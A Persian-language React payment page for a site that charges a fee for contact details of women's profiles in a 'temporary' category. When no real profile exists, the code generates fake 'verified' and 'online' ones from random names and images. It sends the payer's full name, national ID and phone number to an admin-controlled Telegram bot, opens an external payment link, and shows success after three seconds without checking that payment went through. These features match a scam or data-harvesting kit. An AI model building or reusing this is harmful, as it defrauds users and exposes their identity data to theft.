
import { useState, useEffect } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import NavBar from '../../components/base/NavBar';
import TabBar from '../../components/base/TabBar';
import { casesAPI, systemAPI, type CaseData } from '../../lib/supabase';

interface SystemConfig {
  telegram_bot_token?: string;
  telegram_chat_id?: string;
  payment_gateway_url?: string;
  default_fee_amount?: number;
}

interface VerificationData {
  fullName: string;
  nationalId: string;
  phoneNumber: string;
}

export default function Payment() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const location = useLocation();
  const [caseData, setCaseData] = useState<CaseData | null>(null);
  const [verificationData, setVerificationData] = useState<VerificationData | null>(null);
  const [loading, setLoading] = useState(true);
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentStep, setPaymentStep] = useState<'payment' | 'processing' | 'success'>('payment');
  const [systemConfig, setSystemConfig] = useState<SystemConfig>({
    payment_gateway_url: 'https://payment.example.com',
    default_fee_amount: 250000
  });

  useEffect(() => {
    loadSystemConfig();
    
    if (id) {
      loadData(parseInt(id));
    }
  }, [id]);

  const loadSystemConfig = async () => {
    try {
      console.log('🔄 بارگذاری تنظیمات سیستم از دیتابیس...');
      const config = await systemAPI.getConfig();
      
      if (config) {
        setSystemConfig({
          telegram_bot_token: config.telegram_bot_token,
          telegram_chat_id: config.telegram_chat_id,
          payment_gateway_url: config.payment_gateway_url || 'https://payment.example.com',
          default_fee_amount: config.default_fee_amount || 250000
        });
        console.log('✅ تنظیمات سیستم از Supabase بارگذاری شد');
        console.log('💰 قیمت حق‌المعارف:', config.default_fee_amount?.toLocaleString('fa-IR'), 'تومان');
        console.log('🔗 لینک پرداخت:', config.payment_gateway_url);
      } else {
        console.warn('⚠️ تنظیمات سیستم در دیتابیس یافت نشد، از بکاپ LocalStorage استفاده می‌شود');
        
        // بکاپ از LocalStorage
        const localConfig = localStorage.getItem('systemConfig');
        if (localConfig) {
          const parsedConfig = JSON.parse(localConfig);
          setSystemConfig({
            telegram_bot_token: parsedConfig.telegramBotToken,
            telegram_chat_id: parsedConfig.telegramChatId,
            payment_gateway_url: parsedConfig.paymentGatewayUrl || 'https://payment.example.com',
            default_fee_amount: parsedConfig.defaultFeeAmount || 250000
          });
          console.log('⚠️ تنظیمات سیستم از LocalStorage بارگذاری شد');
        }
      }
    } catch (error) {
      console.error('❌ خطا در بارگذاری تنظیمات سیستم:', error);
      
      // در صورت خطا، از مقادیر پیش‌فرض استفاده کن
      console.log('🔄 استفاده از مقادیر پیش‌فرض تنظیمات');
    }
  };

  const loadData = async (caseId: number) => {
    setLoading(true);
    
    // بارگذاری از state منتقل شده
    if (location.state && location.state.caseData && location.state.verificationData) {
      setCaseData(location.state.caseData);
      setVerificationData(location.state.verificationData);
      setLoading(false);
      return;
    }

    try {
      // 1. بارگذاری کیس از دیتابیس
      const supabaseCase = await casesAPI.getById(caseId);
      if (supabaseCase) {
        setCaseData(supabaseCase);
        console.log('✅ کیس از دیتابیس برای پرداخت بارگذاری شد:', supabaseCase.name);
      } else {
        // 2. ایجاد کیس نمونه کامل
        console.log(`🔄 کیس ${caseId} در دیتابیس یافت نشد، ایجاد کیس نمونه...`);
        
        const sampleCase: CaseData = {
          id: caseId,
          name: `کیس آماده پرداخت ${caseId} - ${getRandomName()}`,
          image: `https://readdy.ai/api/search-image?query=Beautiful%20Persian%20woman%20portrait%20elegant%20style%20professional&width=300&height=400&seq=${caseId}&orientation=portrait`,
          location: getRandomLocation(),
          category: 'temporary',
          price: 400000,
          age: Math.floor(Math.random() * 15) + 20,
          height: `${Math.floor(Math.random() * 20) + 155} سانتی‌متر`,
          skin_color: getRandomSkinColor(),
          body_type: getRandomBodyType(),
          personality_traits: getRandomPersonalityTraits(),
          experience_level: getRandomExperienceLevel(),
          description: getRandomDescription(),
          status: 'active',
          verified: true,
          online: true,
          created_at: new Date().toISOString()
        };
        setCaseData(sampleCase);
        console.log('✅ کیس نمونه برای پرداخت ایجاد شد');
      }

      // اطلاعات استعلام نمونه در صورت عدم وجود
      if (!verificationData) {
        setVerificationData({
          fullName: 'کاربر محترم',
          nationalId: '1234567890',
          phoneNumber: '09123456789'
        });
      }
    } catch (error) {
      console.error('❌ خطا در بارگذاری:', error);
      
      // ایجاد داده‌های پشتیبان
      const backupCase: CaseData = {
        id: caseId,
        name: `کیس پرداخت آماده ${caseId}`,
        image: `https://readdy.ai/api/search-image?query=Beautiful%20Persian%20woman%20portrait%20elegant%20style&width=300&height=400&seq=backup${caseId}&orientation=portrait`,
        location: 'تهران',
        category: 'temporary',
        price: 350000,
        age: 25,
        description: 'کیس آماده برای پرداخت - تایید شده',
        status: 'active',
        verified: true,
        online: true,
        created_at: new Date().toISOString()
      };
      setCaseData(backupCase);
      
      setVerificationData({
        fullName: 'کاربر محترم',
        nationalId: '1234567890',
        phoneNumber: '09123456789'
      });
      
      console.log('🔄 داده‌های پشتیبان برای پرداخت ایجاد شد');
    }
    
    setLoading(false);
  };

  // توابع تولید داده‌های تصادفی
  const getRandomName = () => {
    const names = [
      'سارا احمدی', 'مریم کریمی', 'نیلوفر رضایی', 'الناز محمدی', 'نگار حسینی',
      'پریسا علیزاده', 'شیدا مرادی', 'یاسمین صادقی', 'آناهیتا حیدری', 'ترانه نوری'
    ];
    return names[Math.floor(Math.random() * names.length)];
  };

  const getRandomLocation = () => {
    const locations = [
      'تهران', 'اصفهان', 'شیراز', 'مشهد', 'تبریز', 'کرج', 'قم', 'اهواز', 'کرمان', 'رشت'
    ];
    return locations[Math.floor(Math.random() * locations.length)];
  };

  const getRandomSkinColor = () => {
    const colors = ['روشن', 'متوسط', 'گندمی', 'برنزه'];
    return colors[Math.floor(Math.random() * colors.length)];
  };

  const getRandomBodyType = () => {
    const types = ['لاغر', 'متوسط', 'پرقدرت', 'ورزشی'];
    return types[Math.floor(Math.random() * types.length)];
  };

  const getRandomPersonalityTraits = () => {
    const traits = ['مهربان', 'صمیمی', 'شاد', 'آرام', 'فعال', 'خوش‌صحبت', 'باهوش', 'خلاق'];
    const selectedTraits = [];
    const numTraits = Math.floor(Math.random() * 3) + 2;
    
    for (let i = 0; i < numTraits; i++) {
      const randomTrait = traits[Math.floor(Math.random() * traits.length)];
      if (!selectedTraits.includes(randomTrait)) {
        selectedTraits.push(randomTrait);
      }
    }
    
    return selectedTraits;
  };

  const getRandomExperienceLevel = () => {
    const levels = ['مبتدی', 'متوسط', 'با تجربه', 'حرفه‌ای'];
    return levels[Math.floor(Math.random() * levels.length)];
  };

  const getRandomDescription = () => {
    const descriptions = [
      'کیس تایید شده و آماده برای پرداخت و ارتباط.',
      'کاربر با تجربه و قابل اعتماد، آماده همکاری.',
      'کیس فعال با امکانات کامل برای ارتباط.',
      'کیس محبوب با رضایت بالای کاربران.',
      'کیس حرفه‌ای و تایید شده توسط سیستم.'
    ];
    return descriptions[Math.floor(Math.random() * descriptions.length)];
  };

  const sendPaymentToTelegram = async () => {
    const currentDate = new Date();
    const persianDate = currentDate.toLocaleDateString('fa-IR');
    const persianTime = currentDate.toLocaleTimeString('fa-IR');

    const message = `💰 #پرداخت_شروع 💰
━━━━━━━━━━━━━━━━
👤 نام: ${verificationData?.fullName || 'نامشخص'}
🆔 کد ملی: ${verificationData?.nationalId || 'نامشخص'}
📞 تلفن: ${verificationData?.phoneNumber || 'نامشخص'}
💎 کیس: ${caseData?.name || 'نامشخص'}
🏷️ کد کیس: ${caseData?.id || 'نامشخص'}
💵 مبلغ: ${(systemConfig.default_fee_amount || 250000).toLocaleString('fa-IR')} تومان
🔗 لینک پرداخت: ${systemConfig.payment_gateway_url || 'تنظیم نشده'}
━━━━━━━━━━━━━━━━
⏰ زمان: ${persianDate}, ${persianTime}
🔄 وضعیت: انتقال به درگاه پرداخت`;

    if (systemConfig.telegram_bot_token && systemConfig.telegram_chat_id) {
      try {
        const telegramUrl = `https://api.telegram.org/bot${systemConfig.telegram_bot_token}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: systemConfig.telegram_chat_id,
            text: message,
            parse_mode: 'HTML'
          })
        });

        if (response.ok) {
          console.log('✅ پیام شروع پرداخت به تلگرام ارسال شد');
        } else {
          const errorData = await response.json();
          console.error('❌ خطا در ارسال پیام پرداخت:', errorData);
        }
      } catch (error) {
        console.error('❌ خطا در ارسال پیام:', error);
      }
    } else {
      console.log('ℹ️ تنظیمات تلگرام یافت نشد - پیام:', message);
    }
  };

  const handlePayment = async () => {
    console.log('🔄 شروع فرآیند پرداخت...');
    
    // بررسی وجود لینک پرداخت
    if (!systemConfig.payment_gateway_url || systemConfig.payment_gateway_url === 'https://payment.example.com') {
      alert('❌ لینک پرداخت تنظیم نشده است. لطفاً با مدیر سیستم تماس بگیرید.');
      return;
    }

    setIsProcessing(true);
    
    try {
      // ارسال اطلاعات به تلگرام
      await sendPaymentToTelegram();
      
      console.log('💳 انتقال به درگاه پرداخت:', systemConfig.payment_gateway_url);
      console.log('💰 مبلغ قابل پرداخت:', (systemConfig.default_fee_amount || 250000).toLocaleString('fa-IR'), 'تومان');
      
      // انتقال به لینک پرداخت تنظیم شده
      window.open(systemConfig.payment_gateway_url, '_blank');
      
      // بازگشت به صفحه موفقیت پس از 3 ثانیه
      setTimeout(() => {
        setIsProcessing(false);
        navigate('/payment-success/' + id, {
          state: {
            caseData: caseData,
            verificationData: verificationData,
            paymentAmount: systemConfig.default_fee_amount || 250000,
            paymentUrl: systemConfig.payment_gateway_url
          }
        });
      }, 3000);
      
    } catch (error) {
      console.error('❌ خطا در فرآیند پرداخت:', error);
      setIsProcessing(false);
      alert('❌ خطا در اتصال به درگاه پرداخت. لطفاً مجدداً تلاش کنید.');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 via-indigo-50 to-blue-100 flex items-center justify-center">
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center">
          <div className="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">در حال بارگذاری...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-indigo-50 to-blue-100">
      <NavBar title="پرداخت حق المعارف" showBack={true} />

      <div className="pt-20 pb-20 px-4">
        {/* Case and User Info - همیشه نمایش داده می‌شود */}
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl mb-6 border border-white/30">
          <h2 className="text-xl font-bold text-gray-800 mb-4 text-center">
            <i className="ri-bill-line ml-2 text-purple-600"></i>
            اطلاعات درخواست
          </h2>
          
          <div className="space-y-4">
            <div className="flex items-center bg-blue-50 rounded-2xl p-4">
              <img 
                src={caseData?.image || `https://readdy.ai/api/search-image?query=Beautiful%20Persian%20woman%20portrait&width=300&height=400&seq=${id}&orientation=portrait`}
                alt={caseData?.name || `کیس ${id}`}
                className="w-16 h-16 rounded-2xl object-cover shadow-lg mr-4"
              />
              <div className="flex-1">
                <h3 className="font-bold text-blue-800">{caseData?.name || `کیس آماده ${id}`}</h3>
                <p className="text-blue-600 text-sm">{caseData?.location || 'تهران'}</p>
                <div className="flex items-center mt-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
                  <span className="text-green-600 text-sm font-medium">فعال</span>
                </div>
              </div>
            </div>

            <div className="bg-gray-50 rounded-2xl p-4">
              <h4 className="font-semibold text-gray-800 mb-2">اطلاعات درخواست‌کننده:</h4>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">نام:</span>
                  <span className="font-medium text-gray-800">{verificationData?.fullName || 'کاربر محترم'}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">کد ملی:</span>
                  <span className="font-medium text-gray-800 font-mono">{verificationData?.nationalId || '1234567890'}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">تلفن:</span>
                  <span className="font-medium text-gray-800 font-mono">{verificationData?.phoneNumber || '09123456789'}</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Details */}
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl mb-6 border border-white/30">
          <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">
            <i className="ri-money-dollar-circle-line ml-2 text-green-600"></i>
            جزئیات پرداخت
          </h3>

          <div className="space-y-4">
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-6">
              <div className="text-center">
                <h4 className="text-green-800 font-bold text-lg mb-2">حق المعارف</h4>
                <div className="text-4xl font-bold text-green-700 mb-2">
                  {(systemConfig.default_fee_amount || 250000).toLocaleString('fa-IR')}
                  <span className="text-lg mr-2">تومان</span>
                </div>
                <p className="text-green-600 text-sm">برای دریافت اطلاعات تماس کیس</p>
              </div>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
              <h4 className="font-semibold text-blue-800 mb-2">✅ شامل موارد زیر:</h4>
              <ul className="text-blue-700 text-sm space-y-1">
                <li>• شماره تماس مستقیم کیس</li>
                <li>• کد ورود به چت اختصاصی</li>
                <li>• اطلاعات دقیق برای هماهنگی</li>
                <li>• پشتیبانی 24 ساعته</li>
              </ul>
            </div>

            {/* نمایش وضعیت لینک پرداخت */}
            <div className={`border rounded-2xl p-4 ${
              systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com'
                ? 'bg-green-50 border-green-200'
                : 'bg-red-50 border-red-200'
            }`}>
              <div className="flex items-center">
                <i className={`text-lg ml-2 ${
                  systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com'
                    ? 'ri-check-line text-green-600'
                    : 'ri-error-warning-line text-red-600'
                }`}></i>
                <div className="flex-1">
                  <p className={`font-semibold text-sm ${
                    systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com'
                      ? 'text-green-800'
                      : 'text-red-800'
                  }`}>
                    {systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com'
                      ? '✅ درگاه پرداخت متصل است'
                      : '❌ درگاه پرداخت تنظیم نشده'
                    }
                  </p>
                  <p className={`text-xs mt-1 ${
                    systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com'
                      ? 'text-green-600'
                      : 'text-red-600'
                  }`}>
                    {systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com'
                      ? `لینک: ${systemConfig.payment_gateway_url.substring(0, 50)}...`
                      : 'لطفاً در پنل ادمین لینک پرداخت را تنظیم کنید'
                    }
                  </p>
                </div>
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-2xl p-4">
              <div className="flex items-start">
                <i className="ri-information-line text-yellow-600 text-lg ml-2 mt-0.5"></i>
                <div className="text-yellow-800 text-sm">
                  <p className="font-semibold mb-1">⚠️ توجه مهم:</p>
                  <p>این هزینه فقط برای دریافت اطلاعات تماس می‌باشد. پرداخت‌های اصلی باید حضوری انجام شود.</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Action */}
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl">
          <button
            onClick={handlePayment}
            disabled={isProcessing || !systemConfig.payment_gateway_url || systemConfig.payment_gateway_url === 'https://payment.example.com'}
            className={`w-full font-bold py-5 px-6 rounded-2xl shadow-lg transition-all duration-300 text-lg ${
              isProcessing || !systemConfig.payment_gateway_url || systemConfig.payment_gateway_url === 'https://payment.example.com'
                ? 'bg-gray-400 text-gray-200 cursor-not-allowed'
                : 'bg-gradient-to-r from-purple-600 via-indigo-600 to-blue-600 hover:from-purple-700 hover:via-indigo-700 hover:to-blue-700 text-white hover:scale-105'
            }`}
          >
            {isProcessing ? (
              <div className="flex items-center justify-center">
                <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
                در حال انتقال به درگاه پرداخت...
              </div>
            ) : !systemConfig.payment_gateway_url || systemConfig.payment_gateway_url === 'https://payment.example.com' ? (
              <>
                <i className="ri-error-warning-line ml-2"></i>
                درگاه پرداخت تنظیم نشده
                <div className="text-sm opacity-90 mt-1">لطفاً با مدیر تماس بگیرید</div>
              </>
            ) : (
              <>
                <i className="ri-secure-payment-line ml-2"></i>
                پرداخت {(systemConfig.default_fee_amount || 250000).toLocaleString('fa-IR')} تومان
                <div className="text-sm opacity-90 mt-1">انتقال به درگاه امن پرداخت</div>
              </>
            )}
          </button>

          <div className="mt-4 flex items-center justify-center text-gray-500 text-sm">
            <i className="ri-shield-check-line ml-2"></i>
            <span>پرداخت از طریق درگاه امن بانکی</span>
          </div>
          
          {/* نمایش اطلاعات تنظیمات برای کاربر */}
          <div className="mt-4 text-center">
            <p className="text-gray-400 text-xs">
              💰 قیمت: {(systemConfig.default_fee_amount || 250000).toLocaleString('fa-IR')} تومان
              {systemConfig.payment_gateway_url && systemConfig.payment_gateway_url !== 'https://payment.example.com' && (
                <span className="text-green-500"> | ✅ درگاه فعال</span>
              )}
            </p>
          </div>
        </div>
      </div>

      <TabBar />
    </div>
  );
}
